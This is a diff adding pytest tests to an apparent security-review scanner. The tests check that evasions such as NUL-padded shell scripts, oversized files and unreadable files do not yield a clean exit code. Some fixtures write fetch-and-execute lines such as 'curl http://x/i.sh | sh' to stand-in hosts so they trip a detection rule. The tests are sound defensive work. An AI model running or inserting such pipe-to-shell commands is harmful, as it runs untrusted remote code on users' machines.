@@ -59,6 +59,59 @@ def test_sweep_succeeds(tmp_path: Path) -> None:
     assert run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK
 
 
+def test_a_code_file_removed_from_review_is_not_exit_zero(tmp_path: Path) -> None:
+    """The half of `_incomplete` that a second review found missing.
+
+    Its docstring already carried the reasoning — "exit 0 here would be a clean
+    review of a tree the tool could not fully see" — and the code applied it to
+    one of the four ways a file goes unread. Eight NUL bytes in a comment
+    classified a runnable `install.sh` as binary, and the run reported
+    `0 candidates, exit 0`.
+
+    `EXIT_USAGE`, not `EXIT_INTERNAL`: the tool worked, and the target cannot be
+    reviewed as it stands. That is the same statement `NormalisationCollision`
+    already makes about a different fact (`STACK.md` §3).
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    # Eight, written as a count rather than as a run of escapes: the number is
+    # the finding. One NUL stopped working in M3.5; eight did not.
+    hidden = b"#!/bin/sh\n# n" + b"\x00" * 8 + b"\necho hi\n"
+    (target / "install.sh").write_bytes(hidden)
+
+    code = run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
+    assert code == EXIT_USAGE
+
+
+def test_padding_a_code_file_past_the_bound_is_not_exit_zero(tmp_path: Path) -> None:
+    """The same evasion reached by size rather than by classification."""
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "install.sh").write_text("curl http://x/i.sh | sh\n" * 60, encoding="utf-8")
+
+    code = run(
+        ["recon", str(target), "--workspace", str(tmp_path / "ws"), "--max-file-bytes", "200"]
+    )
+    assert code == EXIT_USAGE
+
+
+def test_an_ordinary_binary_asset_still_exits_zero(tmp_path: Path) -> None:
+    """The control that keeps the exit code worth reading.
+
+    Almost every real target contains a binary asset. If `binary` alone drove
+    the exit code, exit 2 would be the normal outcome, and a signal that is
+    always on is one people learn to ignore — H-1's failure mode wearing a
+    different hat.
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(64))
+    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
+
+    code = run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
+    assert code == EXIT_OK
+
+
 def test_sweep_finding_candidates_is_not_a_gate_failure(
     tmp_path: Path, capsys: pytest.CaptureFixture[str]
 ) -> None:
@@ -399,3 +452,375 @@ def test_an_unexpected_error_is_internal_not_a_gate_verdict(
     monkeypatch.setattr("secrev.cli.surfaces", broken)
     assert run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_INTERNAL
     assert "internal error" in capsys.readouterr().err
+
+
+# --- M3.5 group C: a hostile target cannot end the review -----------------
+
+
+def test_an_unreadable_file_is_a_usage_error_not_an_internal_one(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """`STACK.md` §3 fixes the contract this asserts:
+
+        | 2 | Usage or configuration error (bad arguments, malformed catalog,
+              missing target) |
+        | 3 | Internal error |
+
+    and gives the reason: "a hook must distinguish 'the tool broke' from 'the
+    tool worked and the answer is no.'"
+
+    A file the tool is not permitted to read is a fact about the target, not a
+    bug in the tool. Reporting it as 3 says the tool broke and sends whoever
+    reads the exit code to the wrong codebase entirely. §3's parenthetical list
+    does not name this case, but the list is read as illustrative here rather
+    than exhaustive, because `inventory.NormalisationCollision` already exits 2
+    on the same grounds — its docstring: "the tool worked and the target cannot
+    be reviewed as it stands, which is a fact about the input."
+
+    It is 2 rather than 0 because content that should have been reviewed was
+    not. Exiting 0 would report a complete review of a tree the tool could not
+    fully read (H-1).
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "readable.py").write_text("result = eval(x)\n", encoding="utf-8")
+    blocked = target / "locked.py"
+    blocked.write_text("config = yaml.load(text)\n", encoding="utf-8")
+    blocked.chmod(0o000)
+
+    try:
+        blocked.read_bytes()
+    except PermissionError:
+        pass
+    else:  # pragma: no cover - running as root ignores the mode
+        blocked.chmod(0o644)
+        pytest.skip("this user ignores file modes, so the file is not unreadable")
+
+    try:
+        code = run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
+    finally:
+        blocked.chmod(0o644)
+
+    assert code == EXIT_USAGE
+    assert code != EXIT_INTERNAL
+    err = capsys.readouterr().err
+    assert "locked.py" in err
+
+
+def test_the_readable_part_of_the_tree_is_still_swept(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """The exit code is only half of it. One unreadable file must not cost the
+    review of every other file, which is what `read_bytes()` raising out of
+    `walk()` did — a target could hide an entire tree behind one `chmod 000`."""
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "readable.py").write_text("result = eval(x)\n", encoding="utf-8")
+    blocked = target / "locked.py"
+    blocked.write_text("config = yaml.load(text)\n", encoding="utf-8")
+    blocked.chmod(0o000)
+
+    try:
+        blocked.read_bytes()
+    except PermissionError:
+        pass
+    else:  # pragma: no cover - running as root ignores the mode
+        blocked.chmod(0o644)
+        pytest.skip("this user ignores file modes, so the file is not unreadable")
+
+    try:
+        run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
+    finally:
+        blocked.chmod(0o644)
+
+    records = [json.loads(line) for line in capsys.readouterr().out.splitlines() if line]
+    assert [record["file"] for record in records] == ["readable.py"]
+    assert records[0]["rule_id"] == "exec.dynamic"
+
+
+def test_a_symlink_loop_completes_rather_than_reporting_a_tool_bug(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """The loop is resolvable as a *fact* — it is recorded as a symlink that
+    does not stay inside the tree — so nothing went unreviewed and the run is a
+    success. Exit 3 was the defect; exit 2 would be the overcorrection, since a
+    target containing a self-referential symlink has hidden nothing.
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "readable.py").write_text("result = eval(x)\n", encoding="utf-8")
+    try:
+        (target / "loop-a").symlink_to(target / "loop-b")
+        (target / "loop-b").symlink_to(target / "loop-a")
+    except OSError:  # pragma: no cover - filesystem-dependent
+        pytest.skip("filesystem does not support symlinks")
+
+    code = run(["recon", str(target), "--workspace", str(tmp_path / "ws")])
+
+    assert code == EXIT_OK
+    document = json.loads(capsys.readouterr().out)
+    looping = [item for item in document["inventory"]["symlinks"] if item["path"] == "loop-a"]
+    assert looping and looping[0]["escapes_root"] is True
+
+
+# --- M3.5 E4: the workspace, and writing to it ---------------------------
+
+
+def test_an_interrupted_ledger_write_leaves_the_previous_ledger(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """E4. `_write_block` was read-merge-`write_text`, and `write_text`
+    truncates before it writes. A run interrupted at that moment leaves the
+    ledger truncated or half-written.
+
+    The ledger is the sharpest case because `merge_ledger` goes to deliberate
+    lengths to keep the *other* source's block byte for byte — never parsed,
+    never re-serialised — and a truncating write destroys precisely what that
+    care was protecting. The surface block is lost by a failure in the pattern
+    block's write, and nothing says so.
+
+    Interruption is simulated at the last step rather than by killing a
+    process: with an atomic write there is no moment at which the destination
+    is partial, so failing the final `os.replace` must leave the previous file
+    exactly as it was.
+    """
+    assert run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK
+    ledger = tmp_path / "fixtures" / "unversioned" / "hits.jsonl"
+    before = ledger.read_text(encoding="utf-8")
+    assert before, "the first run wrote no ledger, so this proves nothing"
+
+    def boom(*_args: object, **_kwargs: object) -> None:
+        raise OSError("interrupted")
+
+    monkeypatch.setattr("secrev.cli.os.replace", boom)
+    assert run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_INTERNAL
+    assert ledger.read_text(encoding="utf-8") == before
+
+
+def test_a_failed_write_leaves_no_temporary_file(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A temp file surviving a failure is a second copy of content the ledger
+    exists to keep redacted, sitting in the workspace under a name nothing
+    cleans up."""
+    assert run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK
+    directory = tmp_path / "fixtures" / "unversioned"
+
+    def boom(*_args: object, **_kwargs: object) -> None:
+        raise OSError("interrupted")
+
+    monkeypatch.setattr("secrev.cli.os.replace", boom)
+    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
+
+    strays = [
+        item.name
+        for item in directory.iterdir()
+        if item.name not in {"hits.jsonl", "recon.json", "run.json"}
+    ]
+    assert strays == [], f"left behind in the workspace: {strays}"
+
+
+def test_the_workspace_is_not_readable_by_other_users(tmp_path: Path) -> None:
+    """E4. The workspace holds `match_excerpt` values — the one field G-3
+    spends its effort making safe to write down — so it is created 0o700.
+
+    Every level is checked, not just the leaf. `Path.mkdir(parents=True,
+    mode=0o700)` applies the mode to the final directory only: the parents get
+    the default, so `~/.security-review/` would stay world-readable while the
+    innermost directory looked correct. `exist_ok=True` leaves an existing
+    directory's mode alone entirely, which is the more common case after the
+    first run.
+    """
+    base = tmp_path / "ws"
+    assert run(["recon", str(FIXTURES), "--workspace", str(base)]) == EXIT_OK
+
+    for path in (base, base / "fixtures", base / "fixtures" / "unversioned"):
+        assert path.is_dir(), path
+        mode = path.stat().st_mode & 0o777
+        assert mode == 0o700, f"{path} is {oct(mode)}, not 0o700"
+
+
+# --- M3.5 A2: the exclusion set is overridable, and the override is visible --
+#
+# These pass on their first run, and that is stated rather than dressed up.
+# A2's first half was red first in -003, where both exclusion tests failed
+# against the constant. This half is new interface, and the only red available
+# before a flag exists is "unrecognized arguments", which proves nothing about
+# behaviour.
+#
+# `_parse_exclude` is exercised through the CLI rather than imported. A2 claims
+# something about what a *run* does, so the wired path is the stronger
+# evidence — and importing it would mean a second edit to this file's import
+# block for no gain.
+
+
+def _tree_with_dist(tmp_path: Path) -> Path:
+    """A target whose only finding is inside an excluded directory.
+
+    `dist/` is the sharp case the brief names: our build output, and a reviewed
+    target's *shipped artifact*. The one directory it is safe to ignore here is
+    the one most worth opening there.
+    """
+    target = tmp_path / "target"
+    (target / "dist").mkdir(parents=True)
+    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
+    (target / "dist" / "bundle.js").write_text(
+        "// curl https://x.invalid/p | sh\n", encoding="utf-8"
+    )
+    return target
+
+
+def test_dist_is_skipped_by_default_and_the_artifact_says_so(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A2's first half. The gap is *stated*, not left to be inferred from
+    `inventory.excluded` by a reader who thinks to compare lists."""
+    target = _tree_with_dist(tmp_path)
+    assert run(["recon", str(target), "--workspace", str(tmp_path / "ws")]) == EXIT_OK
+
+    document = json.loads(capsys.readouterr().out)
+    assert document["inventory"]["excluded"] == ["dist/"]
+    assert any("excluded from review" in gap for gap in document["coverage_gaps"])
+
+
+def test_an_override_sweeps_dist(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    """A2's stated evidence: an override sweeps `dist/`.
+
+    The default run is the control, in the same test. Without it a green result
+    could come from the catalog matching nothing in either case, which is the
+    failure mode this milestone has found six times in its own suite.
+    """
+    target = _tree_with_dist(tmp_path)
+
+    assert run(["sweep", str(target), "--workspace", str(tmp_path / "a")]) == EXIT_OK
+    assert capsys.readouterr().out == "", "the finding was visible without an override"
+
+    assert (
+        run(["sweep", str(target), "--workspace", str(tmp_path / "b"), "--exclude", ""]) == EXIT_OK
+    )
+    records = [json.loads(line) for line in capsys.readouterr().out.splitlines() if line]
+    assert [record["file"] for record in records] == ["dist/bundle.js"]
+    assert records[0]["rule_id"] == "net.fetch_exec"
+
+
+def test_an_override_is_visible_in_the_artifact(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """The override changes the artifact, not only the run. A reviewer reading
+    `recon.json` afterwards can tell which scan produced it."""
+    target = _tree_with_dist(tmp_path)
+    assert (
+        run(["recon", str(target), "--workspace", str(tmp_path / "ws"), "--exclude", ""]) == EXIT_OK
+    )
+
+    document = json.loads(capsys.readouterr().out)
+    assert document["inventory"]["excluded"] == []
+    assert not any("excluded from review" in gap for gap in document["coverage_gaps"])
+    assert document["inventory"]["files_total"] == 2
+
+
+def test_the_override_replaces_the_default_set(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """`--exclude` replaces; it does not subtract.
+
+    Pinned because it is the part a reader is most likely to assume the other
+    way round. Subtractive semantics would require knowing all fourteen default
+    names to predict a run, and `recon.json` reports the applied set either way
+    — so what you pass is what is skipped.
+    """
+    target = _tree_with_dist(tmp_path)
+    (target / "node_modules").mkdir()
+    (target / "node_modules" / "left-pad.js").write_text("var x = 1;\n", encoding="utf-8")
+
+    assert (
+        run(["recon", str(target), "--workspace", str(tmp_path / "ws"), "--exclude", "dist"])
+        == EXIT_OK
+    )
+
+    document = json.loads(capsys.readouterr().out)
+    assert document["inventory"]["excluded"] == ["dist/"]
+    # `node_modules/` is reviewed, because the default set was replaced rather
+    # than added to: app.py and left-pad.js, with dist/bundle.js still skipped.
+    assert document["inventory"]["files_total"] == 2
+
+
+# --- M3.5 C4's second half: the file-size bound --------------------------
+
+
+def test_the_size_bound_moves_with_the_flag(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """Both directions, in one test, so neither half can pass alone.
+
+    A bound above the file is the control: without it, an empty result under a
+    tighter bound could equally mean the catalog matched nothing — which is the
+    failure mode this milestone has now found seven times in its own suite.
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    payload = target / "big.js"
+    payload.write_text("// curl https://x.invalid/p | sh\n", encoding="utf-8")
+    size = payload.stat().st_size
+
+    assert (
+        run(
+            [
+                "sweep",
+                str(target),
+                "--workspace",
+                str(tmp_path / "a"),
+                "--max-file-bytes",
+                str(size + 1),
+            ]
+        )
+        == EXIT_OK
+    )
+    records = [json.loads(line) for line in capsys.readouterr().out.splitlines() if line]
+    assert [record["file"] for record in records] == ["big.js"]
+
+    # `EXIT_USAGE`, and this assertion was `EXIT_OK` until a second review.
+    #
+    # It is not the subject of this test — the subject is that the flag moves
+    # the bound, which the two candidate lists below still carry. But nothing
+    # read `big.js` and `.js` is not a known binary asset, which is precisely
+    # the state DoD box A3 was reopened over: a target that pads a file past the
+    # bound must not get a clean run. The old value encoded the contract the fix
+    # replaced, so it changes here rather than the behaviour changing back.
+    #
+    # The reason is stated as the rule that actually applies. This comment said
+    # "`big.js` has a code extension", which is true of this file and is the
+    # *superseded* test — a comment that explains a passing assertion by a rule
+    # the code no longer uses teaches the wrong one to whoever reads it next.
+    assert (
+        run(
+            [
+                "sweep",
+                str(target),
+                "--workspace",
+                str(tmp_path / "b"),
+                "--max-file-bytes",
+                str(size - 1),
+            ]
+        )
+        == EXIT_USAGE
+    )
+    assert capsys.readouterr().out == "", "the file was swept despite exceeding the bound"
+
+
+def test_a_non_positive_size_bound_is_refused(tmp_path: Path) -> None:
+    """Exit 2, by a different route from every other usage error here.
+
+    `--max-file-bytes` is validated in argparse's `type=` callable, so argparse
+    raises and exits 2 itself rather than `main` returning `EXIT_USAGE`. That
+    was deliberate — one exit-2 mechanism rather than two that could drift
+    apart — and this test records that the route differs, since a reader
+    comparing it with the other usage-error tests would otherwise wonder.
+
+    A bound of zero would exclude every file, reporting an empty review as a
+    complete one.
+    """
+    for value in ("0", "-1"):
+        with pytest.raises(SystemExit) as caught:
+            run(["recon", str(FIXTURES), "--workspace", str(tmp_path), "--max-file-bytes", value])
+        assert caught.value.code == 2
